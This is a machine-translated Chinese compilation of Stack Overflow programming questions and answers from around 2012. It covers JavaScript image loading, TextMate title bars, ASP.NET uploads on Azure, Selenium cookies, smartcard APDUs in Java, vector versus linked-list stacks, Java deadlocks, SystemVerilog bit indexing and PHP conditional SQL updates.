## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:43:47.450

您需要监听图像的 onload 事件：

```
var image = document.createElement("img");
image.onload = function() {
    // Call API
};

image.src = "http://a57.foxnews.com/global.fncstatic.com/static/managed/img/Scitech/660/371/tardar-sauce-the-cat.jpg";

document.body.appendChild(image); 
```

# macos - 为什么使用“mate”命令打开TextMate标题栏不显示文件路径？

> ID：13822865
> 
> 赞同：4
> 
> 时间：2012-12-11T15:20:14.203
> 
> 标签：macos, textmate

当我使用`mate`命令在 TextMate 中打开文件时，标题栏不允许我右键单击以查看文件的路径，而在 TextMate 应用程序中打开的文件确实显示完整路径。`mate`是否存在阻止此功能的命令行为或者这是一个错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T19:39:36.687

如果您希望在标题栏中显示路径，则该`mate`命令必须包含文件的完整路径。与假定的当前工作目录 (CWD) 一起使用`mate`不会固有地提供`mate`完整的文件路径。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-07T11:42:48.450

如果您有一个本地项目 .tm_properties 文件，让 TM2 显示路径很简单 - 添加如下内容：

```
windowTitle = "$TM_DISPLAYNAME – $TM_DIRECTORY" 
```

适用`$ mate [filename]`于终端和正常查找器使用。

但我同意它似乎不适用于全球 .tm_properties 是相当蹩脚的 - 尽管我很想被证明是错误的！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-10-22T14:57:23.663

我认为 TextMate 已经更新了他们网站上的文档。它甚至包含一个类似的片段来解决上述问题。

> 例如，如果我们想显示相对于项目文件夹的路径，我们可以使用：
> 
> ```
> windowTitle = '${TM_DIRECTORY:+${TM_DIRECTORY/^${projectDirectory}(?:\/(.+))?/${1:+$1/}/}}$TM_DISPLAYNAME$windowTitleProject$windowTitleSCM' 
> ```

来源：[https ://macromates.com/textmate/manual/projects](https://macromates.com/textmate/manual/projects)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-07-04T17:55:42.403

1.  转到文件夹“/Applications/TextMate.app/Contents/Resources”或您的 TextMate.app 安装文件夹。在修改文件之前关闭 textmate 应用程序。

2.  如下修改文件 Default.tmProperties。我在这里提供了差异：

    差异 Default.tmProperties
    ../textmateBin/TextMate.app/Contents/Resources/Default.tmProperties 10c10

    ## < windowTitleProject = '${projectDirectory:+ — ${projectDirectory}}'

    > windowTitleProject = '${projectDirectory:+ — ${projectDirectory/^.*///}}'

3.  重新启动您的 textmate 应用程序，它应该显示您的文件夹路径:)

# asp.net-mvc - 无法在 Windows azure 上托管的 mvc 4 Web 应用程序上上传图像

> ID：13822866
> 
> 赞同：0
> 
> 时间：2012-12-11T15:20:19.770
> 
> 标签：asp.net-mvc, azure, asp.net-mvc-4, file-permissions

我使用 ASP.Net MVC 4 开发了一个 Web 应用程序，然后将该 Web 应用程序托管在 windows azure (windowsazure.com) 上。

我的网站无法上传图像/创建文件。我应该添加一些权限吗？或者如何添加这些权限？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:46:41.240

请使用编辑问题提供代码片段。给出您提供的代码，失败的部分很可能是以下行：

> Server.MapPath("~/UploadImages/" + ...);

您真正需要做的是首先检查该文件夹是否已经存在：

```
string targetFolder = Server.MapPath("~/UploadImages");
if(!System.IO.Directory.Exists(taretfolder))
{
 System.IO.Directory.Create(targetFolder);
}
// then copy the file here 
```

“问题”，如果可以说这是一个问题，就是当您尝试将文件放入其中时服务器没有创建此目录。在尝试复制文件之前，您必须首先访问该目录。顺便说一句，这不是“Azure”问题。如果您按原样获取代码并将其上传到托管商（无需手动创建或处理 UploadImages 文件夹），您将遇到同样的问题。

# c# - 如何在 IE webdriver C# 中删除 cookie

> ID：13822867
> 
> 赞同：1
> 
> 时间：2012-12-11T15:20:23.987
> 
> 标签：c#, internet-explorer, cookies, selenium, webdriver

我正在尝试删除 IE32 和 IE64 位 webdriver 中的 cookie，我尝试使用以下命令

```
WebDriver.Cookies.DeleteCookieNamed("cookie name");
WebDriver.Manage().Cookies.DeleteAllCookies(); 
```

关于这两个选项都不是删除cookies，请帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-13T06:53:22.380

只是我们的运气，Selenium 2.34 和 IEDriverServer 刚刚问世。现在，您可以在 IE 中轻松启动干净的浏览器（已删除 cookie），而无需进行黑客攻击。[请参阅此处](http://automationoverflow.blogspot.in/2013/07/clean-session-in-internet-explorer.html)博客文章中的评论。但现在你需要的只是代码。

```
var options = new InternetExplorerOptions{EnsureCleanSession = true};
var ieDriver = new InternetExplorerDriver(options); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T17:19:49.193

以下代码可能有助于删除所有 cookie：

```
 string[] cookies = Request.Cookies.AllKeys;
        foreach (string cookie in cookies)
        {
            BulletedList1.Items.Add("Deleting " + cookie);
            Response.Cookies[cookie].Expires = DateTime.Now.AddDays(-1);
        } 
```

或者如果想在注销后删除或清除cookie，请按照以下方式操作：

```
HttpCookieCollection cookieCols= New HttpCookieCollection();
cookieCols = Request.Cookies;
Request.Cookies.Remove("PASS");
Request.Cookies.Remove("UID") ; 
```

您也可以在注销事件中编写如下语句来清除 cookie：

```
FormsAuthentication.SignOut(); 
```

# c# - 通过 C# 从 MySql 检索时，指定的强制转换无效

> ID：13822874
> 
> 赞同：0
> 
> 时间：2012-12-11T15:20:35.980
> 
> 标签：c#, mysql, datetime

我正在尝试使用 MySql 数据库中的记录填充数据集，然后遍历数据集中表的每条记录，创建并填充每个通过循环的自定义数据对象，最后重新调整创建的数据对象列表.

我遇到的问题是在尝试创建每个数据对象时出现错误：

错误：

> System.InvalidCastException：指定的强制转换无效。

该错误突出显示了这行代码：`var newsRelease = new NewsRelease`

我怀疑以下两个问题之一：1）由于 MySql DateTime 数据类型与 C# DateTime 数据类型的格式问题，无法创建对象/ 2）选择查询实际上没有返回任何内容，因此没有任何内容可以填充 NewsRelease 对象和。

我已经尝试测试这两个问题，但似乎无法确定是否真的是问题所在。任何关于我的问题是什么以及如何解决它的见解都非常感谢。

```
public List<NewsRelease> SELECT()
        {
            MySqlConnection connection = new MySqlConnection(ConnectionString);
            MySqlCommand cmd = connection.CreateCommand();
            cmd.CommandText = "SELECT * FROM NewsReleases";
            MySqlDataAdapter adap = new MySqlDataAdapter(cmd);
            DataSet ds = new DataSet();
            adap.Fill(ds);

            List<NewsRelease> NewsReleases = new List<NewsRelease>();

            foreach (DataRow row in ds.Tables[0].Rows)
            {
                var newsRelease = new NewsRelease
                {
                    NewsReleaseId = (int)row["NewsReleaseId"],                   
                    Title = (string)row["Title"],
                    Content = (string)row["Content"],
                    Images = Convert.ToBoolean((int)row["Images"]),
                    MediaAdvisory = Convert.ToBoolean((int)row["MediaAdvisory"]),
                    PublicAdvisory = Convert.ToBoolean((int)row["PublicAdvisory"]),                    
                    Time = (DateTime)row["Time"],
                    DatePublished = (DateTime)row["DatePublished"],
                    DateCreated = (DateTime)row["DateCreated"],
                    DateModified = (DateTime)row["DateModified"],
                    ModifiedBy = (string)row["ModifiedBy"],
                    HasFrenchVersion = Convert.ToBoolean((int)row["HasFrenchVersion"])
                };

                NewsReleases.Add(newsRelease);
            }

            return NewsReleases;
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:22:22.417

它只是您从基中检索到的行之一，没有您*期望它必须具有*的类型。

要识别问题并按顺序解决问题，请逐行初始化`newRelease`，以便运行时*准确*找到问题发生的行。

```
var newsRelease = new NewsRelease(); 
newsRelease.NewsReleaseId = (int)row["NewsReleaseId"];
newsRelease. Title = (string)row["Title"];
....
.... 
```

一次发现并解决了问题，如果愿意，您可以回到以前的初始化方式。

# php - Zend 框架控制器中的常规查询字符串

> ID：13822877
> 
> 赞同：-1
> 
> 时间：2012-12-11T15:20:47.600
> 
> 标签：php, model-view-controller, zend-framework, controller, query-string

我正在使用 Zend 框架，它会重写 URL，但我想在控制器中处理常规查询，获取类似 transactionsExternal.phppage=1&start=0&limit=100&sort=threadid&dir=ASC&callback=Ext.data.JsonP.callback1 的请求

有人可以告诉我如何在控制器中获取这个 GET 请求变量吗？考虑到 Zend 阻止我只使用像 $_GET[something] $this->getRequest()->getParams(); 这样的变量 也没有返回任何东西

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:43:48.697

ZF 不会阻止您使用`$_GET`，尽管不鼓励这样做。`$this->getRequest()->getParam('start')`，或者`$this->getRequest()->getParams()`会给你 GET 参数。因此，如果这对您不起作用，则其他地方会出现问题。

'transactionsExternal.php' 绝对是您 ZF 应用程序的一部分吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:44:24.970

您的控制器和操作是如何设置的？

Zend Framework 1 使用键/对值来获取参数。因此，您可能有一个事务控制器和一个 get 操作。请求如下所示：

```
domain.com/transactions/get 
```

要附加和 ID GET 参数，您将执行以下操作：

```
domain.com/transactions/get/id/10 
```

然后在您的控制器操作中，您将执行以下操作来获取 id 值：

```
$request = $this->getRequest();
$request->getParam('id'); 
```

# java - 使用 javax.smartcardio 的智能卡 ISO 7816 APDU

> ID：13822879
> 
> 赞同：1
> 
> 时间：2012-12-11T15:20:51.807
> 
> 标签：java, smartcard

我已经习惯`javax.smartcardio`了从智能卡中读取序列号而不费力气。但是现在我被分配在空白卡上创建 MF（没有它无法读取序列号）。我正在根据 ISO 7816 指南为此创建 APDU 命令，但无法创建正确的 APDU 命令，因为我的十六进制值是转换为错误的字节。

```
import javax.smartcardio.Card;
import javax.smartcardio.CardChannel;
import javax.smartcardio.CardException;
import javax.smartcardio.CardTerminal;
import javax.smartcardio.CommandAPDU;
import javax.smartcardio.ResponseAPDU;
import javax.smartcardio.TerminalFactory;

class SmartCardAPIs {

    public int Create_MF() throws CardException{

        //--Variable declaration
        int result=0;
        Card card=null;     
        byte[] responseData=null;
        ResponseAPDU answer=null;
        String SW1=null;
        String SW2=null;
        int cla,  ins,  p1,  p2;
        byte[] data=null;
        //---------------------------------------------

        //--1--Establish connection with the smart card
        TerminalFactory factory = TerminalFactory.getDefault();
        List<CardTerminal> terminals = factory.terminals().list();
        // Use the first terminal
        CardTerminal terminal = terminals.get(0);
        // Connect with the card
        card = terminal.connect("*");
        CardChannel channel = card.getBasicChannel();           
        //---------------------------------------------

        //--2--Create MF 
        cla=0x00;
        ins=0xE0;
        p1=0x00;
        p2=0x00;
        data = new byte[] {
            (byte) 0x21,
            (byte) 0x62,
            (byte) 0x1F,
            (byte) 0x82, // **** Getting converted to -126 ****
            --
            --
            --
        };          
        answer = channel.transmit(new CommandAPDU(cla,  ins,  p1,  p2, data));
        responseData= answer.getBytes();

        if(responseData!=null)
        {
            if(responseData.length==2)
            {
                SW1=String.format("%02X ", (responseData[0])).trim();
                SW2=String.format("%02X ", (responseData[1])).trim();
            }
        }       
    }
} 
```

我有2个问题

1：命令 APDU 中的数据占用了一个错误的字节（标记为*****）。

2：SW1 和 SW2 返回为 6A 80，这意味着数据字段中的参数不正确（我猜是因为将十六进制格式的 int 转换为字节时为负值，但由于我被迫这样做，所以无济于事）。

我在这里放置的部分 APDU 命令是我提供的完整命令的一部分，并且该命令是 100% OK 并且经过测试，因为我已经成功地使用带有命令的智能卡工具在空白卡中创建 MF .我现在想在java中做同样的事情。

我认为问题出在创建此 APDU 的方式上，可能是负值问题（尽管我创建了 Applet 以从卡中读取序列号，但我对 java APDU 的东西不是很熟悉）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T08:10:43.707

既然您说，您手头有一个工作命令，并且肯定仔细检查了它的 java 表示：您有多确定该命令在之前的尝试中没有成功执行？（显然只允许一个 MF。）问题是，报告的错误代码与“正确的 APDU 已知”假设相矛盾，这是我能想到的唯一解决方案。就给出的而言，Java 代码看起来是正确的。

其他想法：ISO 创建文件的命令数据字段应该以 FCI 的 0x6X 之类的开头。可能您的 0x21 是整个模板的长度（应该作为 LC 发送），java 从字节数组的长度构造自身，因此请尝试将其省略。第 3 个字节是 0x1F，即 0x21 减去标签和长度，这一事实支持了这一假设。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-22T06:39:43.043

我试过这个命令：

..

..

```
private static final byte[] Select_App = {(byte)0x00,(byte)0xA4,(byte)0x04,(byte)0x00,(byte)0x04,(byte)0x50,(byte)0x54,(byte)0x4B,(byte)0x65}; 
```

......

他们工作得很好，我从卡上得到了正确的回应。但我在android上试过这个命令。所以我认为字节转换是正确的，我们不需要转换任何东西

好吧，关于 java.smartcardio.*; 我和你有同样的问题，我无法使用该库发送任何命令。但是有人说我必须使用一些 java wrapper 来发送一些命令。嗯...顺便说一句，我仍在努力... :-)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-07-31T06:08:26.913

您需要通过以下方法将字节正确转换为十六进制。

```
Integer class = StringUtil.parseHex("your class as string"); 
```

类 StringUtil

* * *

```
public class StringUtil {
public static Integer parseHex(String iStr) {
    int mask = 255;
    if (iStr.length() > 2)
        mask = 65535;
    try {
        return Integer.valueOf(Integer.parseInt(iStr, 16) & mask);
    } catch (Exception ex) {
    }
    return null;
} 
```

# c++ - 使用向量类实现堆栈的链表与动态数组

> ID：13822880
> 
> 赞同：6
> 
> 时间：2012-12-11T15:20:52.440
> 
> 标签：c++, arrays, linked-list, stack, dynamic-arrays

我正在阅读实现堆栈的两种不同方式：链表和动态数组。与动态数组相比，链表的主要优点是不必调整链表的大小，而如果插入的元素过多，则必须调整动态数组的大小，从而浪费大量时间和内存。

这让我想知道这是否适用于 C++（因为有一个向量类可以在插入新元素时自动调整大小）？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-11T16:26:39.090

很难比较两者，因为它们的内存使用模式完全不同。

**矢量调整大小**

矢量根据需要动态调整自身大小。它通过分配新的内存块、将数据从旧块移动（或复制）到新块、释放旧块来实现这一点。在典型情况下，新块的大小是旧块的 1.5 倍（与流行的看法相反，在实践中 2 倍似乎很不寻常）。这意味着在重新分配的短时间内，它需要的内存大约是您实际存储的数据的 2.5 倍。其余时间，正在使用的“块”最少 2/3 ^(rds)满，最多完全满。如果所有尺寸的可能性相同，我们可以预期它平均约为^(5/6)。从另一个方向来看，我们可以预期大约 1/6^或大约 17% 的空间被“浪费”

当我们通过这样的常数*因子*调整大小时（而不是总是添加特定大小的块，例如以 4Kb 为增量增长），我们得到所谓的摊销常数时间加法。换句话说，随着数组的增长，调整大小的频率会呈指数下降。数组中的项目被复制的平均次数趋于一个常数（通常在 3 左右，但取决于您使用的增长因子）。

**链表分配**

使用链表，情况就大不相同了。我们从来没有看到调整大小，所以我们没有看到一些插入的额外时间或内存使用。同时，我们*确实看到基本上**一直*在使用额外的时间和内存。特别是，链表中的每个节点都需要包含一个指向下一个节点的指针。根据节点中数据的大小与指针的大小相比，这可能会导致大量开销。例如，假设您需要一堆`int`s。`int`在一个与指针大小相同的典型情况下，这将意味着 50% 的开销——一直如此。指针*大于*_`int`; 两倍大小是相当常见的（64 位指针，32 位 int）。在这种情况下，您有大约 67% 的开销——也就是说，很明显，每个节点用于指针的空间是存储数据的两倍。

不幸的是，这通常只是冰山一角。在典型的链表中，每个节点都是单独动态分配的。至少如果您要存储小数据项（例如`int`），分配给节点的内存可能（通常会）甚至大于您实际请求的数量。所以——你要求 12 字节的内存来保存一个 int 和一个指针——但是你得到的内存块很可能被四舍五入到 16 或 32 字节。现在您看到的开销至少为 75%，很可能是 ~88%。

就速度而言，情况非常相似：动态分配和释放内存通常很慢。堆管理器通常具有空闲内存块，并且必须花时间搜索它们以找到最适合您要求的大小的块。然后它（通常）必须将该块分成两部分，一个用于满足您的分配，另一个用于满足其他分配的剩余内存。同样，当您释放内存时，它通常会返回相同的空闲块列表并检查是否有相邻的内存块已经空闲，因此它可以将两者重新连接在一起。

分配和管理大量内存块的成本很高。

**缓存使用**

最后，对于最近的处理器，我们遇到了另一个重要因素：缓存使用。在向量的情况下，我们将所有数据彼此相邻。然后，在使用中的向量部分结束后，我们有一些空内存。这导致了出色的缓存使用——我们正在使用的数据被缓存；我们不使用的数据对缓存几乎没有影响。

使用链表，指针（以及每个节点中可能的开销）分布在整个链表中。即，我们关心的每条数据旁边都有指针的开销，以及分配给我们不使用的节点的空白空间。简而言之，缓存的*有效*大小减少了与列表中每个节点的总体开销大致相同的因子——即，我们可能很容易看到只有 1/8^的缓存存储了我们关心的日期，并且7/8^(用于)存储指针和/或纯垃圾。

**概括**

当您的节点数量相对较少时，链表可以很好地工作，每个节点都非常大。如果（对于堆栈来说更典型）您正在处理相对大量的项目，每个项目都非常小，那么您*不太*可能看到时间或内​​存使用的节省。恰恰相反，对于这种情况，链表基本上更可能浪费大量时间和内存。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-11T15:27:51.267

是的，你所说的对于 C++ 来说是正确的。由于这个原因，里面的默认容器[`std::stack`](http://en.cppreference.com/w/cpp/container/stack)，也就是C++中的标准栈类，既不是向量也不是链表，而是一个双端队列（a `deque`）。这几乎具有矢量的所有优点，但它可以更好地调整大小。

基本上，an[`std::deque`](http://en.cppreference.com/w/cpp/container/deque)是 内部排序*数组的链表。*这样，当它需要调整大小时，它只是添加另一个数组。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-11T15:47:58.287

首先，链表和动态数组之间的性能权衡比这要微妙得多。

根据要求，C++ 中的向量类被实现为“动态数组”，这意味着它必须具有摊销常数成本才能将元素插入其中。这通常是通过以几何方式增加数组的“容量”来完成的，也就是说，每当你用完（或接近用完）时，你就会将容量翻倍。最后，这意味着重新分配操作（分配新的内存块并将当前内容复制到其中）只会在少数情况下发生。在实践中，这意味着重新分配的开销仅在性能图上显示为对数间隔的小峰值。这就是“摊销不变”成本的含义，因为一旦你忽略了那些小尖峰，

在链表实现中，您没有重新分配的开销，但是，您确实有在 freestore（动态内存）上分配每个新元素的开销。因此，开销有点规律（不是尖峰，有时可能需要），但可能比使用动态数组更重要，特别是如果元素复制成本相当低（尺寸小，对象简单）。在我看来，链表只推荐用于复制（或移动）成本很高的对象。但归根结底，这是您需要在任何给定情况下测试的东西。

最后，重要的是要指出，对于任何广泛使用和遍历元素的应用程序，参考位置通常是决定因素。使用动态数组时，元素一个接一个地打包在内存中，并且进行中序遍历非常有效，因为 CPU 可以在读/写操作之前抢先缓存内存。在一个普通的链表实现中，从一个元素到下一个元素的跳转通常涉及在完全不同的内存位置之间的相当不稳定的跳转，这有效地禁用了这种“预取”行为。因此，除非列表的各个元素非常大并且对它们的操作通常执行时间很长，否则使用链表时缺乏预取将是主要的性能问题。

你可以猜到，我很少使用链表 ( `std::list`)，因为有利的应用程序的数量很少而且相差甚远。通常，对于大型且复制成本高的对象，通常最好简单地使用指针向量（您可以获得与链表基本相同的性能优势（和劣势），但内存使用量更少（用于链接指针)，如果需要，您可以获得随机访问功能)。

`std::deque`我能想到的主要情况是，当您需要经常在中间（而不是两端）插入元素时，链表胜过动态数组（或分段动态数组）。然而，这种情况通常出现在您保存一组已排序（或以某种方式排序）的元素时，在这种情况下，您将使用树结构来存储元素（例如，二叉搜索树 (BST)），不是链表。并且通常，这样的树使用动态数组或分段动态数组（例如，不缓存缓存的动态数组）内的半连续内存布局（例如，广度优先布局）来存储它们的节点（元素）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-11T15:28:11.920

是的，对于`C++`任何其他语言都是如此。动态数组是**一个概念**。C++ 的事实`vector`并没有改变理论。向量 in`C++`实际上在内部进行大小调整，因此此任务不是开发人员的责任。使用 时，实际成本不会神奇地消失`vector`，它只是转移到标准库实现中。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-11T15:30:47.933

`std::vector`使用动态数组实现，而`std::list`实现为链表。使用这两种数据结构需要权衡取舍。选择最适合您需求的那一款。

*   正如您所指出的，如果动态数组已满，则添加项目可能会花费大量时间，因为它必须自行扩展。但是，它的访问速度更快，因为它的所有成员都在内存中组合在一起。这种紧密的分组通常也使它对缓存更加友好。

*   链表永远不需要调整大小，但遍历它们需要更长的时间，因为 CPU 必须在内存中跳转。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-11T15:25:05.290

> 这让我想知道这是否适用于 c++，因为有一个向量类可以在插入新元素时自动调整大小。

是的，它仍然成立，因为`vector`调整大小是一项潜在的昂贵操作。在内部，如果达到向量的预分配大小并且您尝试添加新元素，则会发生新的分配并将旧数据移动到新的内存位置。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-11T15:27:08.233

从[C++ 文档](http://www.cplusplus.com/reference/vector/vector/push_back/)：

> vector::push_back - 在末尾添加元素
> 
> 在当前最后一个元素之后，在向量的末尾添加一个新元素。val 的内容被复制（或移动）到新元素。
> 
> 这有效地将容器大小增加了 1，当且仅当新向量大小超过当前向量容量时，这会导致分配的存储空间的自动重新分配。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-12-11T15:39:17.873

[http://channel9.msdn.com/Events/GoingNative/GoingNative-2012/Keynote-Bjarne-Stroustrup-Cpp11-Style](http://channel9.msdn.com/Events/GoingNative/GoingNative-2012/Keynote-Bjarne-Stroustrup-Cpp11-Style) 跳到 44:40。`std::vector`正如视频中所解释的那样，您应该尽可能喜欢`std::list`Bjarne 本人的 . 由于`std::vector`将所有元素彼此相邻地存储在内存中，因此它将具有缓存在内存中的优势。这对于添加和删除元素`std::vector`以及搜索也是如此。他说这`std::list`比`std::vector`.

如果你真的想要一个堆栈，你应该真正使用`std::stack`而不是自己制作。

# android - 我怎样才能捕捉到视图变得可见

> ID：13822882
> 
> 赞同：4
> 
> 时间：2012-12-11T15:21:11.307
> 
> 标签：android, view, scrollview

我在 ScrollView 上膨胀视图。

而且我需要获取事件，当滚动其中一个视图（例如，最后一个或特殊类型）变得可见时（在屏幕区域中）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:49:41.433

如果视图更改可见性，则调用 onlayout 方法，您可以尝试覆盖该方法并检查其状态。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-06T07:45:53.017

您需要覆盖视图的[`onVisibilityChanged()`](http://developer.android.com/reference/android/view/View.html#onVisibilityChanged%28android.view.View,%20int%29). 当视图的祖先之一更改可见性时，也会调用此方法。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-11T15:26:21.823

这我膨胀了我的 GridView 并得到你想要的

```
public class MyGrideView extends GridView {

    boolean expanded = false;

    public MyGrideView(Context context) {
        super(context);
    }

    public MyGrideView(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    public MyGrideView(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
    }

    public boolean isExpanded() {
        return expanded;
    }

    @Override
    public void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        // HACK! TAKE THAT ANDROID!
        if (isExpanded()) {
            // Calculate entire height by providing a very large height hint.
            // But do not use the highest 2 bits of this integer; those are
            // reserved for the MeasureSpec mode.
            int expandSpec = MeasureSpec.makeMeasureSpec(
                    Integer.MAX_VALUE >> 2, MeasureSpec.AT_MOST);
            super.onMeasure(widthMeasureSpec, expandSpec);

            ViewGroup.LayoutParams params = getLayoutParams();
            params.height = getMeasuredHeight();
        } else {
            super.onMeasure(widthMeasureSpec, heightMeasureSpec);
        }
    }

    public void setExpanded(boolean expanded) {
        this.expanded = expanded;
    }

} 
```

# java - 这段代码怎么会导致死锁？

> ID：13822890
> 
> 赞同：0
> 
> 时间：2012-12-11T15:21:31.807
> 
> 标签：java, scjp

在通过 SCJP6 考试模拟器时，我发现了这样的问题：

```
class Clerk implements Runnable {

    private Record A, B;

    public Clerk(Record a, Record b) {
        A = a;
        B = b;
    }

    public void run() {
        while(true) {
            doStuff(A, B);
        }
    }

    public synchronized void doStuff(Record a, Record b) {
        synchronized(a) {
        synchronized(b) {
            a.add(1);
            b.add(-1);
        }}
    }

} 
```

然后

```
Record a = new Record();
Record b = new Record();

new Thread(new Clerk(a, b)).start();
new Thread(new Clerk(a, b)).start(); 
```

答案说这段代码**会**导致死锁，但我不明白——这到底是怎么可能的？有人可以帮我弄清楚吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-11T15:23:38.663

除了它不能编译之外，该代码中没有死锁。这段代码肯定会造成死锁：

```
new Thread(new Clerk(a, b)).start();
new Thread(new Clerk(b, a)).start(); 
```

因此，如果问题是：`Clerk`类会成为死锁的根源吗？那么答案是肯定的。

**编辑**

应该很快死锁的简短示例。如果在原始问题中使用 a 和 b，则程序运行良好。

```
public class Test1 {

    public static void main(String[] args) {
        Record a = new Record();
        Record b = new Record();

        new Thread(new Clerk(a, b)).start();
        new Thread(new Clerk(b, a)).start();
    }

    static class Record {
    }

    static class Clerk implements Runnable {

        private Record A, B;

        public Clerk(Record a, Record b) {
            A = a;
            B = b;
        }

        public void run() {
            while (true) {
                System.out.println("in thread " + Thread.currentThread());
                for (int i = 0; i < 10000; i++) {
                    doStuff(A, B);
                }
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException ex) {
                }
            }
        }

        public synchronized void doStuff(Record a, Record b) {
            synchronized (a) {
                synchronized (b) {
                }
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-11T15:26:16.327

如果一个线程是用 a/b 构造的，而第二个是用 b/a 构造的，我希望这会死锁。

在这种情况下，线程将锁定第一个实体，然后锁定第二个实体。如果线程 1 锁定 a 并试图锁定 b，同时线程 2 锁定 b 并等待 a，那么它将全部停止。

这是[Java 教程死锁示例](http://docs.oracle.com/javase/tutorial/essential/concurrency/deadlock.html)，与上面的示例非常相似。

# arrays - SystemVerilog 中对整数类型的索引操作有什么作用？

> ID：13822906
> 
> 赞同：2
> 
> 时间：2012-12-11T15:22:14.033
> 
> 标签：arrays, indexing, system-verilog

我正在尝试将一些 SystemVerilog 代码移植到 C++/SystemC，并且有点卡在我看到奇怪数组索引的几行上。这是我所看到的简化版本。

```
typedef enum bit [2:0] {enu_red, enu_blue, enu_green} typ_enum; 

typedef struct packed {
    bit [3:0] field1;
    bit [3:0] field2;
} typ_struct;

...

var int arr_ints[typ_struct];
var int que_ints[$];

typ_struct obj_struct;
typ_enum   obj_enum;

int i = 3;

// assume all the declared variables hold valid values at this point
// also assume que_ints[i] is valid

if ((!arr_ints[obj_struct][1]) // these two lines are the problem
    && (que_ints[i][obj_struct])
)
begin
    // do something
end 
```

现在，在我移植此代码后，我得到了一些我完全理解的编译器错误，因为原始代码对我来说看起来并不完全正确。在 if 语句的第一行，它看起来像是试图用布尔值索引一个整数类型。在第二个中，它看起来像是试图用枚举值索引一个整数类型。然而，这段代码显然有效。有人可以解释它在做什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T17:03:03.053

这会对整数类型进行位切片。您将访问底层`int`表示的实际位。

如果`que_ints[5]`是整数`0xdeadbeef`，那么：

*   `que_ints[5][3]`是 1
*   `que_ints[5][7:4]`是`0xe`。

在 SystemC 中，[`range()`](http://www.asic-world.com/systemc/data_types3.html)函数是推论。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T17:04:56.237

`arr_ints`是 type 的关联数组`int`，其中用作键的类型是`typ_struct`。

所以`arr_ints[obj_struct]`会给你一个整数。

使用索引整数类型`[n]`将为您提供索引 n 处的位。

所以`arr_ints[obj_struct][1]`会给你整数的第 1 位`arr_ints[obj_struct]`

* * *

在有问题的第二行：

`que_ints`是一个类型的队列`int`。

所以`que_ints[i]`会给你`i`队列中位置的整数。

在`que_ints[i][obj_struct]`中，它会将枚举类型隐式转换为整数值（实际上是 bit[2:0]），并基于此为您提供位索引。

# php - 仅当该值与空值不同时才更新列上的值

> ID：13822911
> 
> 赞同：1
> 
> 时间：2012-12-11T15:22:25.103
> 
> 标签：php, mysql

我有这个表格，现在，我只需要用不为空的变量更新数据库的部分。我的意思是，如果我有这个：

```
$postEmri       = filter_var($_POST["postEmri"], FILTER_SANITIZE_EMAIL);
$postKlienti        = filter_var($_POST["postKlienti"], FILTER_SANITIZE_STRING);
$postTelefoni   = filter_var($_POST["postTelefoni"], FILTER_SANITIZE_STRING); 
```

还有这个：

```
$sql="UPDATE forma SET emri='$postEmri', klienti='$postKlienti', telefoni='$postTelefoni'"; 
```

如果`$postEmri, $postKlienti`是`undefined`或`empty`，我不希望更新该记录。我怎样才能使用某些条件来做到这一点？

谢谢

所以我需要这样做吗？

```
$sql="UPDATE forma SET ";
// add every non-empty field to the query
if (!empty($postEmri)) $sql += " emri='$postEmri',";
if (!empty($postKlienti)) $sql += " klienti='$postKlienti',";
if (!empty($postTelefoni)) $sql += " telefoni='$postTelefoni,'";
// replace the last `,` for `;`
$sql = substr($sql, 0, -1) . ";";
$result=mysql_query($sql) or die(mysql_error()) ; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:25:59.150

如果您只想更新非空字段：

```
$sqlStart="UPDATE forma SET ";
$sql="";
// add every non-empty field to the query
if (!empty($postEmri)) $sql .= " emri='$postEmri',";
if (!empty($postKlienti)) $sql .= " klienti='$postKlienti',";
if (!empty($postTelefoni)) $sql .= " telefoni='$postTelefoni,'";
// if any of the fields is non-empty, run the query
if ($sql != "") {
    // replace the last `,` for `;`
    $sql = substr($sql, 0, -1) . ";";
    // run sql command
    $sqlCommand = $sqlStart.$sql;
} else {
    // no fields to update
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:25:15.977

你可以用[空的](http://php.net/manual/en/function.empty.php)

```
if (!empty($someVariable))
     //do something 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:25:27.410

# 更新

